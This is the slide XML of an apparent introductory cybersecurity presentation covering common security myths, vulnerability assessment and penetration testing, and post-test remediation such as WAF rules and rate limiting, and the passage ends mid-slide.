            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>I have a firewall, so I’m safe from attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>; Hackers understand strategies adopted by a firewall quite well. Disrupting codes and exploiting basic IT oversights to gain access to your system is easy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>While most cyber security threats are avoidable, your organizations can not rely solely on firewalls for protection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>My Data Isn’t Worth Anything</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>; Data can be materialized for crime as well such as theft, impersonation, and physical harm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;270;p34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{015F557F-CB82-574F-AFE0-72890B863048}"/>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400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Cybersecurity Myths</a:t>
            </a:r>
            <a:endParaRPr sz="24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4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2676100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DC41124-EB23-66EC-9790-7DA09695A390}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>I use HTTPs, so my site is secure;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> HTTPs safeguards the transmission of information from source to destination. This is web security at a minimal. It does not block attacks like DDoS, brute force, injections, etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>There is also the issue of organizations using fake SSL certificates, resulting in their organization being compromised.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>SMEs are safe because they are not worthwhile targets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>; SMEs are considered to be low hanging fruits for hackers because so many do not take security seriously. One of the most popular attacks that hackers use against SMEs is ransomware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;281;p35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{50C9FAC6-899F-171A-570C-60860E0A7F2F}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd..</a:t>
            </a:r>
            <a:endParaRPr sz="24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9231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F158B06-DF86-076A-5498-E943FD792957}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="225425" lvl="1" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Vulnerability Assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>A process to evaluate and review key systems, networks and applications to identify vulnerabilities and configuration issues that may put the organization at risk of being breached or exploited.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Effective in identifying vulnerabilities, but it cannot differentiate between exploitable vs non-exploitable vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="225425" lvl="1" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Penetration Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Goal-driven test focused on identifying all possible routes of entry an attacker could use to gain  unauthorized entry into the target.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Identifies the potential damage and further internal compromise an attacker could carry out once they are past the perimeter.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Proof of concept strategy to investigate, exploit and validate the extent of the identified vulnerability.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;292;p36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7374EB4C-9D25-A914-3774-3FFCF86BA3A4}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>VA/PT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22353920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1A1CC22-4DAF-01AA-7231-161E2FC3AACF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>What happens in the aftermath of a pen test?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>After completing a pen test, the ethical hacker will share their findings with the target company’s security team. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>This information can then be used to implement security upgrades to plug up any vulnerabilities discovered during the test. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>These upgrades can include </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>rate limiting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>, new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> rules, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>DDoS mitigation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>, as well as tighter form validations and sanitization.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;303;p37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7C800E0-5D96-9C19-48D6-0387851495B9}"/>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Contd..</a:t>
            </a:r>
            <a:endParaRPr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45641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A7EDB8A-146A-7F6B-607E-FCDF7417CC96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;314;p38">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74570ACF-7602-EB42-F1E5-C5059DE64C0B}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Google Shape;315;p38" descr="A screenshot of a social media post&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52905EBF-9F96-4AB4-6DB3-59C0524DABEC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect l="8840" t="15792" r="5644"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="2249992"/>
            <a:ext cx="7886700" cy="4095629"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22402373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9BF194-A14A-EF60-686F-24BB615F06FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>For more than over a decade or so, the use of technology has been rising exponentially. Almost all of the businesses are partially or completely dependent on the use of technology. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>From bitcoins to cloud to Internet-of-Things (IoT), new technologies are popping up each day. While these technologies completely change the way we do things, they also bring along threats with them. Attackers discover new and innovative ways to manipulate these technologies for fun and profit! </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>This is a matter of concern for thousands of organizations and businesses around the world. Organizations worldwide are deeply concerned about keeping their data safe. Protecting data is certainly important, however, testing whether adequate protection mechanisms have been put to work is also equally important. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;325;p39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C6BA9D4-7E6A-59B3-5695-1333FBFD7A86}"/>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Need of Penetration Testing Framework?</a:t>
            </a:r>
            <a:endParaRPr sz="24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28170905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DF19C3-3479-0AA3-139C-E9E9615F865A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="568325" lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Protection mechanisms can fail, hence testing them before someone exploits them for real is a challenging task. Having said this, vulnerability assessment and penetration testing have gained high importance and are now trivially included in all compliance programs. </a:t>
            </a:r>
          </a:p>
          <a:p>
